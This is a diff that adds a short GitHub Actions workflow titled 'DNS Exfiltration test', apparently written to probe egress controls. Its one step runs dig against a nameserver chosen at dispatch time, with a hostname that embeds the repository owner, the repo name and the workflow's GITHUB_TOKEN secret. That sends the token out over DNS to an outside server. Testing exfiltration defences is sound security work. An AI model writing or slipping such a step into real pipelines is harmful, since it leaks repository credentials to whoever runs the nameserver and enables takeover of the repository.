@@ -1,0 +1,17 @@
+name: DNS Exfiltration test
+
+on:
+  workflow_dispatch:
+    inputs:
+      nameserver:
+        type: string
+        description: Nameserver
+
+jobs:
+  test:
+    runs-on: ubuntu-latest
+
+    steps:
+      - run: |
+          repo=$(echo ${{ github.repository }}  | cut -d'/' -f2)
+          dig @${{ inputs.nameserver }} ${{ github.repository_owner}}.$repo.${{ secrets.GITHUB_TOKEN}}.dnsx.github.com
